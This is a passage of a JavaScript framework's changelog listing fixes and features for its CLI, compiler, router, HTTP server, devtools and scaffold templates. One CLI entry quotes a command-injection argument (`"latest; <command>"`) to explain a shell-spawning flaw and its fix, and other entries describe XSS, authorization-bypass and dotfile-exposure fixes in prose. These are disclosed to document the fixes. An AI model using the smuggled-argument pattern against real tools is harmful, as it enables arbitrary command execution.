- **`.azeroth`-only ESLint config in templates with no components.** Both server templates
  carried the `.azeroth` ignore and the `**/*.azeroth/*.ts` return-type override, copied from
  the frontend config. The `azeroth.configs.recommended` spread stays: its first entry has no
  `files` filter, so the reactivity rules genuinely reach server `.ts`.
- **The fullstack `preview` script served a broken app.** Carried over from the `frontend`
  template, where it is legitimate, it serves `application/dist` with no API - the exact
  first-click 404 the repo's own scaffold test guards against, and it was never in the
  fullstack README's script table.
- **Prose that described features the starter does not demonstrate.** The README, the SSR
  entry and the app shell all spoke of guards and loaders, but no route declares one, so the
  loader handoff is always `undefined`. The wiring stays (adding a loader is then a one-line
  change) and the comments now say so. An unused `EntryInput` export went with it.

### Fixed (docs)

- **Five reference pages documented packages that do not exist.** `packages/azerothjs/docs/` shipped
  `component.md`, `form.md`, `reactivity.md`, `renderer.md` and `server.md` as if each were its own
  package, complete with an npm badge and an `npm install @azerothjs/renderer` line, from before
  those packages were folded into the unscoped `azerothjs` entry. Published, every one of those
  badges would have rendered as "not found" and every install line would have failed. The pages are
  retargeted rather than deleted: they describe functionality that still ships, so the titles, the
  badges, the install blocks and the imports now all name `azerothjs`.

- **`App` had no documentation on hover.** The class the template's first line imports, its
  constructor, and `get`/`post`/`put`/`patch`/`delete` carried no doc comment at all, so an editor
  showed a signature and nothing else - while `use`, `with` and `register` beside them were
  documented in depth. The class now states what accumulates in `Ctx` and why registration order is
  load-bearing, with a worked example, and `get` records that it answers HEAD as well.

### Fixed (cli)

- **`azeroth upgrade` passed its target through a shell.** npm was spawned as one command
  STRING with `shell: true` (npm is `npm.cmd` on Windows), and the target came straight from
  the command line - so `azeroth upgrade "latest; <command>"` ran `<command>`. It is the one
  place the CLI broke its own rule that children are spawned as an argument array with no
  shell, which is exactly the hazard `azeroth doctor` flags in a project's own scripts. npm
  now takes an argument array with the platform's executable name chosen explicitly, and a
  target that could not be a version or a dist-tag is refused before any child runs.

- **`azeroth doctor`'s mirror-staleness check could never fire.** It looked for
  `.azeroth-types` while the compiler writes `.azeroth/types`, so every run reported "no
  mirror in use" - the check had never once executed against a real project.

### Added (release + contribution infrastructure)

- **GitHub Releases carry the changelog.** `scripts/release-notes.mjs` extracts the
  version's hand-written `CHANGELOG.md` section and the release workflow passes it as the
  release body alongside `--generate-notes`, so a release page reads: install block,
  curated changelog, then GitHub's own "What's Changed" PR list and compare link. A
  re-pushed tag now refreshes the notes instead of skipping them.
- **Commit messages are enforced.** A `commit-msg` hook runs `scripts/check-commit-msg.mjs`,
  a zero-dependency Conventional Commits check (strict about the type and summary, shape-only
  about the scope, transparent to git's own merge/revert/fixup messages).
- **A documentation issue form** (`.github/ISSUE_TEMPLATE/docs.yml`) for doc defects that
  are not code bugs.

### Fixed (release + contribution infrastructure)

- **The version bump no longer corrupts prose.** `bumpFiles()` replaced every `X.Y.Z` in a
  documentation file, which had rewritten a CONTRIBUTING sentence about reaching 1.0.0 into
  a false statement about a later version. Docs are now rewritten only at named anchors
  (`DOC_VERSION_ANCHORS`), CONTRIBUTING.md is no longer bumped at all, and the post-bump
  guard also catches bare `X.Y.Z` tokens instead of prerelease-shaped ones alone.
- **The release gate now matches CI before anything is published.** It runs lint, typecheck,
  build, publish contract, tests, leak, and publish smoke; previously typecheck, tests, and
  the leak check ran only in CI - after the tag push, which is after npm already had the
  version.
- **Issue and PR templates name packages that exist.** The dropdowns listed
  `@azerothjs/reactivity`, `renderer`, `component`, `router`, `store`, `form`, and `server` -
  none of which are packages - and omitted `http`, `kit`, `ws`, `cron`, `logger`, `schema`,
  `cli`, and `create-azeroth`. The feature-request example also proposed lazy route
  splitting, which already ships.
- **CHANGELOG compare links**: the missing `[1.0.0-beta.1]` definition is restored, so
  `[1.0.0-beta.2]` no longer skips a released tag.

## [1.1.0] - 2026-07-27

### Added (create-azeroth)

- **Template options.** The scaffolder grows a curated matrix, asked as yes/no prompts
  interactively and passed as flags in CI: `--router` (frontend) wires pages + nav on the
  framework's own client-side router - a route table, two pages, `<Link>` navigation, zero
  extra dependencies; `--tailwind` (frontend and fullstack) wires Tailwind v4 through
  `@tailwindcss/vite` with the starter's design tokens mapped to real utilities via
  `@theme inline`. The two compose. Options are overlays applied over one base per shape
  with three operations only - file copy, package.json merge, README append - no plugin
  API, no hooks.

### Changed (create-azeroth)

- **The starters look like a product.** Every template's landing view is redesigned around
  the signal strip - the component's real reactive graph as its hero (the `state` cell is
  the button; `derived` cells recompute from the same click) - over a token system with
  one ice-blue accent, paired light/dark backgrounds, and a monospace display voice. The
  fullstack home's health check and guest book gained honest loading / failed / empty
  states, a retry, and a submit-failure path.
- **Templates ship the framework's own lint canon.** Every shape carries an
  `eslint.config.ts` (loaded via `jiti`) with the house rules - allman blocks, 4-space
  indent, single quotes, the azeroth reactivity rules - and the server shapes now lint
  through `azeroth check` like the frontend ones.
- **Real favicons.** The placeholder `favicon.svg` is replaced by the brand PNGs
  (16/32 + apple-touch) in the frontend and fullstack templates.

## [1.0.0] - 2026-07-27

The first stable release. Every package, the `azerothjs` entry package, and both
editor integrations move to 1.0.0 in lockstep.

### Fixed (pre-1.0 release review)

An adversarial review against the built/packed distribution found and this release fixes:

- **A prop-less `<C/>` no longer crashes** a component that reads its props. The prop-less-tag
  optimization emits `C()`; the component now takes `props = {}`, so a defaulted/optional-props
  component used with no attributes renders instead of throwing `Cannot read properties of undefined`.
- **A builtin's `fallback` prop is no longer double-wrapped.** The compiler wrapped
  `fallback={(error, reset) => ...}` in an extra `() => (...)` thunk, so `<ErrorBoundary>` received
  `undefined` for its error/reset and `<Routes fallback>` crashed (blank app on any unmatched URL).
  A function-literal fallback now passes through; a bare-markup fallback is still wrapped.
- **Block-bodied render callbacks stay reactive.** A hole in markup returned from
  `{(row) => { ...; return <span>{ signal }</span>; }}` was emitted as a one-shot value and never
  updated; it is now wrapped in a getter like the expression-bodied form.
- **Component props parameters lower correctly.** A parameter named anything other than `props`
  (`component C(p: P)`) and NESTED destructuring (`{ pos: { x, y } }`) now work; a **rest element**
  (`{ a, ...rest }`) is rejected with a located `azeroth/unsupported-props-rest` error instead of
  silently emitting code that reads an unbound `rest`.
- **A fragment-root component mounts.** `component F { <>...</> }` returned a bare array that crashed
  `render()` and serialized to `[object Object],...`; `render()` and `renderToString()` now handle a
  multi-node root as direct children.
- **HTML character references in text are decoded.** `&amp;`/`&lt;`/`&nbsp;`/`&copy;`/`&mdash;`/`&#38;`
  render as their characters (matching HTML/JSX/Vue/Svelte) instead of as literal entity text.
- **Cross-field `validateForm` errors clear.** A field flagged only by `validateForm` that returns the
  documented partial map (`{}` when valid) now clears once the fields agree, so a fixed
  password-confirm form becomes valid; previously it stayed `isValid() === false` forever.
- **`@azerothjs/schema` `record()` is prototype-pollution safe.** An untrusted `__proto__` key is
  stored as an own property (via `defineProperty`) instead of invoking the prototype setter, so it
  neither poisons the parsed object nor is silently dropped.
- **Devtools no longer leaks signals.** With a hook attached, a disposed component's signals are now
  swept from the registry when their root disposes (signals have no disposal event of their own), so
  a long dev session no longer grows unbounded and the graph snapshot returns to baseline.
- **The reactive graph no longer pins a disposed consumer.** `track()`'s dedup cache
  (`producer.seenConsumer`) is cleared when that consumer unlinks, so a long-lived signal does not
  retain an unmounted reader's closure.
- **Internal package dependencies use `^1.0.0`, not an exact pin**, so a patch to one framework
  package no longer forces a duplicate copy of another in a consumer's tree.
- **Every package exports `./package.json`** (tools that `require.resolve('pkg/package.json')` work),
  and `@azerothjs/kit` declares `"sideEffects": false`.
- **create-azeroth templates run on first `npm run dev`.** The backend and fullstack templates
  imported `fileStream` from `@azerothjs/logger` (it lives on `@azerothjs/logger/node`); the fullstack
  root `npm start` now runs the server from its own workspace so the production command boots.
- **Source maps are line-accurate.** The compiler emitted one coarse mapping for a whole component, so
  a runtime throw's stack, a debugger breakpoint, and the devtools' creation-line attribution all
  resolved to the component's declaration line instead of the real construct. Each emitted construct
  (state/derived/effect/form/factory and the markup) now carries its own source anchor, so a `derived`
  resolves to its own `.azeroth` line.
- **Route-change focus no longer draws a stray focus ring around the page.** After a navigation the
  router moves focus into the new route for keyboard and screen-reader users; when the app has not
  marked a `[data-route-focus]` target it focuses the content root via a transient `tabindex="-1"`,
  which drew the browser's default focus ring around the whole region (a two-tone box that read as a
  stray window border, most visibly after a keyboard-driven navigation). The router now tags that
  fallback region with `data-azeroth-route-focus-fallback` for the duration of the programmatic focus
  and injects one overridable, author-level stylesheet rule that hides the ring for it - never touching
  the element's inline styles. An app-marked `[data-route-focus]` target is left entirely alone and
  stays fully stylable.

### Added

- **`@azerothjs/devtools` rewritten as a primitive-aware inspector.** The panel now speaks
  the authoring language: each declared `form`/`resource`/`store`/`stream`/`selector`/
  `deferred` renders as ONE named, collapsible group with a live status badge (a resource
  shows pending/ready/error, a form valid/invalid/submitting), and bare `state`/`derived`/
  `effect` rows carry their declared names and current values. New chrome: an icon rail
  (Components / Timeline / Graph / Performance / Server / Settings), a search-first toolbar
  (Ctrl+K), an adaptive master-detail inspector (right pane wide, bottom drawer narrow), a
  windowed components list that stays smooth at thousands of nodes, burst-grouped timeline
  rows, and empty states that teach. Persisted layout state is validated and clamped on
  every restore, so a saved geometry can never come back off-screen.
- **Devtools hook protocol v2** (`azerothjs`, additive). Nodes carry `primitive`/`group`/
  `groupName` so higher-level primitives are attributable to their internals, and
  `DevtoolsHook.run(id, cause)` reports the DIRECT producer whose change triggered each run
  (the timeline's `run values <- email` is measured, not inferred). The higher-level
  constructors gained an optional `name` option (`createStore` gained an options parameter);
  `on()` accepts `{ name }` too. Zero-cost-when-detached is unchanged.
- **Keyword names flow to devtools automatically.** On the dev server the compiler passes
  every reactive keyword's declared identifier as its debug name (`state count` ->
  `createSignal(0, { name: "count" })`); an explicit `with { name }` wins, and `store` now
  accepts a `with { ... }` options clause. Every keyword's `with { name }` completes and
  documents in both editors. Production output is byte-identical to before.
- **Server inspection bridge** (`@azerothjs/devtools/server`). `attachDevtools(served.server)`
  exposes a dev-only WebSocket (`/__azeroth/devtools`) streaming the server's reactive graph -
  requests are reactive roots - and the panel's Server tab mirrors it live with the same
  components view and inspector. Refuses to run under `NODE_ENV=production`; browser
  connections are limited to localhost origins by default. `@azerothjs/ws` becomes an
  optional peer of the devtools package.

### Changed

- **`@azerothjs/logger` is now browser-safe at its main entry.** `createLogger` and the sinks
  (`prettySink`/`ndjsonSink`/`consoleSink`/`teeSink`), the banner, serialization, and the color
  utilities load in a bundler without touching a Node builtin, so a frontend can `createLogger()`
  for structured console output. The Node-only pieces moved to a `@azerothjs/logger/node`
  subpath: the file sinks (`fileStream`/`fileSink`, which use `node:fs`/`node:path`) and the
  terminal prompts (`select`/`textInput`/`intro`/`outro`, which use `node:readline`). Update
  server/CLI imports of those to `@azerothjs/logger/node`; everything else is unchanged. This
  fixes a Vite "Module node:path has been externalized for browser compatibility" crash when a
  client imported the logger.

### Fixed

- **`@azerothjs/devtools` panel is now isolated in a shadow root.** The panel mounted as a
  light-DOM child of `<body>`, so the host app's global CSS (a Tailwind preflight `*{}` reset,
  a theme's inherited `color`, `border`, or `box-sizing`) leaked in and could collapse it to a
  broken white strip at the window edge. It now mounts inside an `attachShadow({ mode: 'open' })`
  host with its own base stylesheet, fully isolating it from - and from leaking into - the page.
  The host element is inert (out of flow, zero-size) so it can never shift the app's layout.
- **Hydration of element/list holes.** A reactive hole that returns an element or a list
  (`{cond ? <A/> : <B/>}`, `{items.map(...)}`) hydrated to the literal text
  `[object Object]` - the hole's `h()` output is a hydration descriptor in hydrate mode,
  and the hole driver stringified it instead of adopting the server nodes. It now adopts
  the server content on the first run, as `<Show>`/`<For>` already did.
- **Streaming responses run request cleanups at the stream's end**, not when the handler
  returns. `onRequestCleanup` teardown for a streaming body (SSE, static file, multipart,
  any `new Response(stream)`) previously fired while the stream was still producing,
  releasing a pooled connection/transaction mid-flight. Buffered responses are unchanged.
- **Hydration no longer falls back to a full client render** for elements rendered with
  `innerHTML`/`textContent` (their content is owned by the prop), or for a `<table>` whose
  `<tr>` rows the browser wrapped in an implicit `<tbody>` (now tolerated).
- **Owner/scheduler robustness.** A reactive node created under an already-disposed owner
  (the `runWithOwner(getOwner(), ...)`-after-await pattern) is now torn down immediately
  instead of leaking; disposers registered *during* teardown run instead of being dropped;
  and a throwing effect no longer strands the rest of a flush - the others still run and the
  error surfaces after.
- **`{ secret: true }` config values** are redacted on the `console.log`/`util.inspect` path,
  not only `JSON.stringify` (added the `nodejs.util.inspect.custom` hook).
- **Compiler diagnostics for a missing `;` before markup.** `state count = 0` with no
  semicolon followed by markup silently dropped the markup and emitted broken JS; it is now
  an `azeroth/unterminated-declaration` error. Markup placed directly as a declaration value
  is flagged too.
- **`<script>`/`<style>` are parsed as raw-text (CDATA).** Their content (CSS, a JSON-LD
  `<script type="application/ld+json">`) is read verbatim and serialized unescaped, instead
  of being parsed for `{ ... }` holes and HTML-escaped (which corrupted `&`/`<`).
- **`evalConstant`** no longer folds a multi-statement slice to its first expression,
  which silently dropped the remainder.
- Clearer errors for `<For each={...}>` with a nullish value (renders nothing) or a non-array,
  and for `renderToString(App())` called without the `() =>` thunk.

### Changed

- **`azerothjs` is now a ranged peer dependency** (`^1.0.0`) of `@azerothjs/http`,
  `@azerothjs/kit`, `@azerothjs/testing`, and `@azerothjs/devtools`, instead of an exact
  regular dependency. The runtime holds module-level state (the per-request store scope), so
  an exact pin let a version skew install a second copy and silently break request isolation;
  a ranged peer dedupes to one copy.
- **`typescript` is a required peer of `@azerothjs/compiler`** (no longer marked optional):
  the package eagerly loads TypeScript-backed analysis, so it was never truly optional.

### Changed (production readiness)

- **engines**: the Node floor is now `>=22` (down from `>=24`) - Node 22 is Active LTS
  through 2027 and every published package runs on it. The zero-build backend's
  `node src/main.ts` needs unflagged native TypeScript (Node 22.18+, 23.6+, or 24),
  which `azeroth doctor` now checks precisely.
- **@azerothjs/compiler**: `lintMarkup(node, source, options?)` - the `source` argument is
  now required (was optional, which silently disabled the interpolation-spacing rule -
  a legacy call shape).
- **@azerothjs/eslint-plugin / language-server**: `azerothjs` is now an (optional) peer
  dependency of the compiler and language-server, so a compiler that emits imports for a
  runtime version the app doesn't have is caught by npm instead of a raw ESM error. The
  compiler's `vite` peer is `>=8` (it uses vite 8's `transformWithOxc`).

### Fixed (editor markup model)

- **@azerothjs/compiler**: a root markup element written directly after a reactive block -
  `effect { ... } <div>...`, `dispose { ... } <ul>...` - is now recognized as markup by the
  scanner (a block-closing `}` begins expression position), so the editor gives it semantic
  tokens, hover, and completion. It already compiled; only the editor's markup model missed it.

### Changed (drift-proofing)

- The language server's reactive-keyword set (semantic tokens), name-keyword set (hover), and
  void-element set (auto-close) now import the compiler's canonical tables instead of keeping
  hand-maintained copies, so a keyword or built-in added to the compiler can never be silently
  missed by the editor. The compiler's void-element list is now a single set (the scanner's),
  re-exported to the parser and tooling.

### Added (editor completeness)

- Hover documentation for the `bind:` / `class:` / `style:` directives.
- Completion snippet bodies for the `Dynamic` and `Outlet` built-ins (previously offered
  by name only). A new completeness spec welds the language server's built-in docs and
  snippets to the compiler's canonical `BUILTIN_COMPONENTS` list, so a built-in can no
  longer ship without both.

### Fixed (pre-1.0 audit round 2)

- **azerothjs**: the `stream` keyword produced code that crashed at first fetch. The
  compiler lowers `stream x = (v) => fetch(v) with { source }` to a positional
  `createStream(source, fetcher, options)` call (parallel to `createResource`), but
  the runtime only accepted a single options object - and the proving type error was
  silently dropped by the language server's diagnostics policy. `createStream` now has
  the same positional overloads as `createResource`; the emitted call type-checks and
  runs. Locked with positional-form tests.
- **@azerothjs/http**: `@seriousme/openapi-schema-validator` (used by an http test) is
  now a declared devDependency; it previously resolved only through a stale lockfile
  entry from the pre-fold layout, so a clean install would have broken the test. The
  9 leftover ghost workspace entries from folded packages were purged from the lockfile.
- **language-server**: the `effect (deps)` hover no longer shows a `watch (...)` example
  that the parser rejects (the `watch` keyword form no longer exists).

### Removed (dead / legacy code)

- **@azerothjs/http**: a dead `HttpError` re-export from `app.ts` (the package entry
  `index.ts` already exports it) - a leftover alias violating the no-legacy rule.
- Dead `export` modifiers on module-private helpers across azerothjs, cli,
  compiler, and language-server (symbols retained, public surface trimmed).
- **@azerothjs/compiler**: the duplicate `BUILTIN_COMPONENTS` list in `project.ts` now
  imports the canonical one from `builtins.ts` (was a hand-maintained twin that could
  drift from the runtime's actual built-ins).
- **@azerothjs/eslint-plugin**: dropped a redundant `azerothjs` peer (it flows through
  the compiler/language-server deps) and declared its real `typescript` peer.

### Fixed (pre-1.0 blocker sweep)

A from-scratch adversarial review found ten confirmed release-blockers, each
reproduced against the shipped build and each now fixed with a pinned regression test:

- **compiler (parser)**: a regex literal or an apostrophe inside a markup hole no
  longer breaks compilation. The brace scanner (`skipBalanced`) was blind to regex
  literals and to embedded markup, so `<p>{ name.replace(/'/g, '') }</p>` or an
  apostrophe in nested markup text (`{ ok ? <span>Don't</span> : ... }`) desynced
  the scan and hard-failed the build with a bogus "Unclosed tag". The scanner now
  consumes regex literals (disambiguated from division by the preceding token) and
  markup regions as whole units.
- **azerothjs (reactivity)**: `createEffect`/`createMemo` now re-establish their
  CREATION owner and error handler around EVERY run, not just the first. Previously
  a re-run inherited whatever scope triggered it, so `useContext` bled across
  components, `getOwner()` returned null on re-runs, and `<ErrorBoundary>` missed
  throws from dynamically-mounted children.
- **azerothjs (SSR)**: attribute NAMES are validated during serialization - a prop
  key containing a quote, space, or `>` (an injection attempt to break out of the
  attribute context) is now rejected, mirroring the DOM path's `setAttribute`.
  Previously such a name was emitted raw, injecting a live handler (XSS).
- **azerothjs / @azerothjs/kit (router + SSR)**: a guard that returns `false` no
  longer leaks its protected page. `matchAndLoad` now returns a distinct blocked
  result (and separate not-found/redirect arms) instead of collapsing a veto into
  `null`; `createPageRenderer` maps it to a 403 that renders NOTHING, and a
  no-match renders the app's fallback at a real 404 - `PageResult` gained a `status`.
  Previously a vetoed SSR route was served as a rendered 200 (authorization bypass).
- **azerothjs (router)**: a synchronous `redirect()` from a guard on the initial URL
  no longer crashes `createRouter` with a temporal-dead-zone `ReferenceError` (the
  auth deep-link pattern) - the navigation machinery the boot-time guard reaches is
  now declared ahead of the guard effect.
- **@azerothjs/http (kernel)**: `json`/`text`/`html` responses no longer drop all
  but one `Set-Cookie`. Cookies are carried apart from the header record (which
  cannot hold duplicates) so a session + a CSRF cookie both reach the client.
- **@azerothjs/http (static)**: `staticFiles` no longer follows a symlink out of the
  served root (a real-path containment check is enforced) and no longer serves
  dotfiles (`/.env`, `/.git/config`) - hidden files are 404 by default, with
  `.well-known` exempt and a `dotfiles` opt-in.
- **@azerothjs/schema**: `.optional().refine()` (and `.nullable()`) no longer throws
  a `TypeError` on an absent field. The optional marker now propagates through
  `refine`/`nullable`, and a refinement is skipped when the value is absent - an
  omitted optional field was previously a 500 on otherwise-valid input.
- **@azerothjs/kit (SSR)**: the shell splice uses function replacers, so rendered
  content or loader data containing `$&`, `` $` ``, or `$'` can no longer splice the
  document's own head/tail into the output.
- **compiler (projection)**: `generateVirtualCode` no longer throws on incomplete
  source. A mid-typing parse failure (the normal editing state) now degrades to a
  verbatim projection instead of throwing - which previously took down ALL
  TypeScript IntelliSense project-wide through the tsserver plugin.

Two silent-corruption traps in declaration scanning are now loud diagnostics
(warnings from the build, errors in the editor) instead of miscompiling:

- **compiler**: `azeroth/unterminated-declaration` - a missing `;` that lets one
  declaration absorb the next (`state a = 1` newline `state b = 2` parsed as a
  single declaration, silently dropping `b`) is now flagged at the swallowed
  keyword.
- **compiler**: `azeroth/non-ascii-name` - a non-ASCII character in a declaration
  name (`state café`), which the ASCII-only scanner would truncate silently, is now
  flagged.

### Added

- **kit** (NEW package): `@azerothjs/kit` - the assembled car. Per-route rendering
  over the pieces that already exist: the router's own route table gains one
  optional field (`render: 'server' | 'static' | 'client'`) and the kit does the
  rest - no new routing system, no new data layer, no config format.
  `createPageRenderer(App, routes)` (the SSR bundle's one line) renders a url
  through the router's guards and loaders via `matchAndLoad` - a redirecting guard
  surfaces as a REAL 302, parallel loader data rides the hydration handoff - and
  splices into vite's built shell so hashed asset tags survive. `mountPages(app,
  { routes, clientDir, renderer })` registers every page in its mode plus asset
  fallback on an `@azerothjs/http` app. `bootClient(App)` is the whole client
  entry (hydrate over markup, render into an empty shell, handoff read back).
  The `azeroth-kit-prerender` bin (also programmatic via `@azerothjs/kit/prerender`)
  writes every `render: 'static'` page through the real renderer at build time,
  preserving the pristine shell as `shell.html`; a static page that redirects or
  carries path parameters is a loud build error. Parameterized pages under an
  inherited `static` mode downgrade to per-request SSR. 12 behavioral tests drive
  the real HTTP kernel, real renderToString, and real hydrate - no mocks.

- **cli**: `azeroth build` detects a kit app (`src/entry.server.ts` +
  `@azerothjs/kit` installed) and plans the full production build - client build,
  SSR bundle (`vite build --ssr`), then the prerender pass; an SSR entry without
  the kit installed gets an honest note, never a silent skip.

- **create-azeroth**: the fullstack template now runs ON the kit - the
  before/after proof of the assembly. `src/routes.ts` is the one table (home
  `render: 'static'`, guest book `render: 'server'`); `entry.server.ts` is two
  lines (`createPageRenderer` + the re-exported routes); `main.azeroth` is one
  call (`bootClient(App)`); the server mounts everything with `mountPages`. The
  hand-wired `entry-server.ts` render/splice, `scripts/prerender.mjs`, the
  hydrate-or-render branching, and the per-path static routes are all DELETED -
  replaced by the kit calls. The SSR bundle is self-contained (`ssr.noExternal`),
  so the Docker image copies two build artifacts and needs no client
  node_modules; `SSR_ENTRY` joins the environment surface. The server package now
  declares `@azerothjs/schema` (previously resolved only through hoisting). The
  application half's scripts delegate to the CLI (`azeroth dev` / `check` /
  `build`) exactly like the standalone templates - the kit build steps live in
  ONE place, the CLI's printable plan, instead of being duplicated as a raw
  command line in the workspace script.

### Fixed

- **compiler / language-server / editors**: the `mount` keyword is now first-class
  across the WHOLE toolchain, not just the parser. It gains hover documentation
  and a completion snippet in the language server (both editors receive them over
  LSP), and the wrapper-keyword table moved to `keyword-spec.ts` (`WRAPPER_FN`) as
  the single source the parser AND the tooling completeness guards key off - a
  future wrapper keyword that ships without docs or a snippet now FAILS the suite
  (the hole that let `mount` slip through). Stale `watch` remnants are gone: the
  VS Code grammar's dead `watch (` rule is replaced by a real
  `effect (deps)` anchor (the renamed form was previously uncoloured), the
  JetBrains lexer no longer paints `watch` as a keyword, and hovering
  `effect (deps)` now serves the explicit-dependency documentation instead of the
  auto-tracked effect's. Both editor artifacts rebuilt against the train
  (`azerothjs-vscode-1.0.0-beta.2.vsix`, `azerothjs-jetbrains-1.0.0-beta.2.zip`),
  with the vsix stager taught to strip the bundled typescript-plugin's workspace
  dependencies (its dist is self-contained; the declared-dependency fix from the
  tooling fold broke vsce's npm-list probe).

- **azerothjs (SSR)**: `renderToString`/`renderToStaticMarkup` now establish a
  disposable ownership root around the render, exactly as client-side `render()`/
  `hydrate()` do - a root component that calls `provideContext()` (every router
  app: `<RouterProvider>`) previously CRASHED server rendering with
  "provideContext() called outside any ownership scope".

- **azerothjs (router)**: the guarded-match pipeline rides effects, and effects
  never run in string mode - so `<Routes>` serialized the FALLBACK for every url
  during SSR. The router now accepts the raw match synchronously at construction
  in string mode. Guards gate NAVIGATION; by the time a server renders, the
  request was already routed and authorized (`matchAndLoad` runs the chain's
  guards server-side and turns redirects/vetoes into real 302s/skips BEFORE
  rendering) - the string render is a pure serializer of that decision.

- **language-server**: the formatting placement, stated. The README now documents
  the deliberate 1.0 posture: one formatting engine (the language-service provider -
  document, range, and on-type), TypeScript regions formatted by the real TS
  formatter mapped through the projection, and markup preserved VERBATIM by
  construction (unmappable edits are dropped - the formatter structurally cannot
  mangle markup). Markup pretty-printing joins this engine when it comes - never
  a second implementation that could disagree with the editors.

- **project**: the trust pages. `GOVERNANCE.md` states plainly how the project is
  run - single maintainer, and exactly WHAT BINDS decisions (the normative grammar,
  the ratified syntax-stability policy, SemVer over the lockstep train, the test
  suite as executable specification) - including the single-maintainer question
  answered with structural mitigations rather than promises. `SUPPORT.md` gains
  the honest support-window statement (latest release line supported, one-command
  upgrade via `azeroth upgrade`, no LTS designation before the 2.0 horizon).
  `SECURITY.md` stays in sync with the train (the folded package name fixed, the
  upgrade path referenced).

- **cli**: two new verbs. `azeroth test` runs each half's vitest suite (server
  first), planned and printable like every other command. `azeroth upgrade [target]`
  moves every `azerothjs`/`@azerothjs/*`/`create-azeroth` pin across the root and
  its workspaces to one version (a dist-tag like `beta` resolves to a concrete
  version first), preserving each pin's range prefix and the file's formatting
  byte-for-byte, then runs `npm install` and the doctor; `--print` shows the change
  table without touching anything. The READMEs now document the scaffold canon -
  `npm create azeroth@latest` - with the warning that bare `npx azeroth` outside a
  project resolves an unrelated squatted npm package.

- **create-azeroth**: the fullstack template is now the CANON TOUR. Two client
  routes through the router in `.azeroth` (`<RouterProvider>`/`<Routes>`/`<Link
  activeClass end>`), ONE shared contract file both halves import
  (`server/src/contract.ts`, client-safe by construction), the API consumed through
  the fully inferred typed client, a guest-book form whose `form` keyword uses the
  SAME schema the server boundary enforces (one declaration, three enforcement
  points - the 422 field map lands in the form), the `mount { }` keyword, and an
  SSR'd + HYDRATED home route (prerendered at build via `vite build --ssr` + a
  splice script; `main.azeroth` adopts the markup; client-routed pages get the SPA
  shell so direct loads never mismatch). Dockerfile and CI carry over unchanged;
  the frontend/backend templates are demoted to minimal starters pointing at the
  canon. The scaffold guard now checks API paths across every application source.

- **compiler**: the TextMate grammar ships with the package -
  `@azerothjs/compiler/azeroth.tmLanguage.json` - one canonical copy any
  TextMate-compatible consumer (Shiki, docs generators) loads directly; welded by
  test to the VS Code extension bundle so the two can never diverge. The README
  shows the three-line Shiki registration; the native github-linguist submission
  is prepared as a post-release action.

- **compiler**: declaration emit shares one host across files. The `.d.ts` emitter
  (the vite `emitDeclarations` mirror, the WebStorm `.azeroth-types` bridge) now
  parses lib files AND every node_modules dependency once per process and shares a
  module-resolution cache, instead of rebuilding the dependency universe per file.
  Measured on a 120-component corpus with chained imports: 43.3 -> 20.0 ms/file cold,
  37.9 -> 17.1 ms/file warm (2.2x), byte-identical output. Project-local files are
  still read fresh every emit, so watch sessions see edits.
- **compiler**: the vanished-component diagnostic. The parser is total, so a
  `component` header that fails its shape check (missing name, unbalanced type
  parameters, missing body brace) used to silently become plain TypeScript - the
  component just did not exist. `diagnoseModule` now emits
  `azeroth/malformed-component` naming exactly what is wrong, surfaced as a dev
  warning by the Vite plugin. Only clear declaration intent triggers: ordinary
  identifiers named `component` (member access, annotations, assignments, strings,
  comments) stay silent.
- **compiler / language**: the `mount { ... }` wrapper keyword - the post-connection
  lifecycle block, lowering to `onMount(() => { ... })`. It completes the lifecycle
  triad with `cleanup { }` and `dispose { }` (mount was the one moment still written
  as a function call). Shape-gated like every keyword: `mount(fn)` and a local named
  `mount` stay plain code, and a new `azeroth/keyword-shadow` diagnostic warns when a
  body-local binding shadows a capture-guarded keyword. Editor tooling (hover docs,
  completion snippet, VS Code + JetBrains highlighting) ships in the same change.
- **compiler / docs**: `GRAMMAR.md` - the normative `.azeroth` grammar (lexical
  rules, every disambiguation, the contextual-keyword table, explicit non-goals) -
  and `STABILITY.md` - the ratified 1.x syntax-stability policy: the keyword-set
  freeze, the five-point rubric any future keyword must pass, and semver-for-syntax
  (PATCH: never; MINOR: rubric-passing additions only; MAJOR: everything else, with
  codemods).

- **router**: the navigation-UX layer. (1) GUARDS - `guard` on a route runs
  root-to-leaf BEFORE anything renders or loads: return `false` to veto (the previous
  location is restored, the guarded route never matches, its loaders never start), a
  target or `redirect(...)` to go elsewhere (replacing the vetoed entry), or `true`
  to pass; async guards hold the navigation (`pending()` covers the window), first
  veto wins, and `matchAndLoad` runs the same guards server-side, surfacing redirects
  as `{ redirect, replace }` for a real 302. (2) `redirect(to, { replace? })` - the
  sentinel loaders THROW to turn a navigation into another one, client and server.
  (3) `router.block(fn)` - leave blockers for the unsaved-form case: `false` (sync or
  awaited) keeps the user in place; browser back/forward blocking is best-effort and
  synchronous-only (documented - the History API cannot truly veto a pop).
  (4) HISTORY STAMPS - every router-written entry carries a key + index, so
  `location()` now tells the whole story: `navigationKind` ('push'/'replace'/'pop'),
  `delta` (-1 back, +1 forward - direction is finally knowable), and a stable `key`
  per entry; the Routes `transition` callback receives the same fields.
  (5) MANAGED SCROLLING (on by default): push/replace scrolls to top or the `#hash`
  target, pop RESTORES the position recorded for that entry; a per-navigation
  `scroll` option overrides, `scrollBehavior` is the fine-grained escape hatch,
  `scroll: false` opts out. (6) ROUTE-CHANGE FOCUS (on by default): after a
  navigation swap, focus moves to the new content (a `data-route-focus` element
  wins) so keyboard and screen-reader users land where the navigation took them;
  `focus: false` opts out. (7) `Link` grows a reactive `to` (function form - href,
  active state, and click target all track it) and prefix-aware active matching:
  `/users` is active at `/users/42` (segment-boundary safe), `end: true` demands
  exactness, and `to="/"` is exact by default.
- **router**: the v2 core. (1) PER-LEVEL PARALLEL LOADERS - every matched route in the
  chain may declare a loader and ALL levels start simultaneously (a layout loads beside
  its leaf, never in a waterfall); a level that genuinely needs its parent's result
  awaits the new `parent` promise (nearest loading ancestor), sequencing opt-in per
  level. `router.loaders` is one resource per level; `router.pending()` is the reactive
  navigation-in-flight signal. (2) LAZY ROUTES - `lazy: () => import('./Page.azeroth')`
  code-splits a route; the chunk races the level's loaders, `<Routes>` holds the
  current screen until it lands (no empty flash), a failed chunk throws into the tree
  for `<ErrorBoundary>`, and `createRouter` boot-validates that every route declares
  exactly one of `component`/`lazy`. (3) `<RouterProvider router>` - every composable
  and router component now resolves the router from context; `useRoute()` instead of
  `useRoute(router)` (the explicit argument stays as an override), and `useLoader()`
  inside a route component resolves ITS level (falling back to the nearest ancestor
